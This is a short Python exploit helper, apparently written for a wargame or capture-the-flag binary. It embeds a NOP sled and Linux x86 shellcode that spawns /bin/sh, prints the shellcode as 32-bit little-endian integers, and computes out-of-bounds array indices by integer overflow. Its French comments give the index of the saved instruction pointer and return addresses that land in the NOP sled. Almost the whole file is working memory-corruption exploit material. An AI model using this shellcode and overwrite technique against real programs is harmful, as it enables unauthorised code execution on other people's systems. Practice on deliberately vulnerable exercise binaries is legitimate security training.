
def main():
    shellcode = b'\x90'*17 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    zero = 4294967296
    i = 0
    j = 0
    while i < len(shellcode):
        if i % 4 == 0 :
            print(int.from_bytes(shellcode[i : i + 4], byteorder='little', signed=False))
            if j % 3 == 0:
                print((zero + j * 4) / 4)
            else:
                print(j)
            print("------------")
            j+=1
        i+=1

    print("idx of $eip : ", (114 * 4 + 4294967296) / 4)



    

if __name__ == "__main__":
    main()

# idx = (114 * 4 + 4294967296) / 4 (=0 du overflow)

# value = 4294956300 = 0xffffd50c = dans le NOP

# other value 4294956292 = 0xffffd504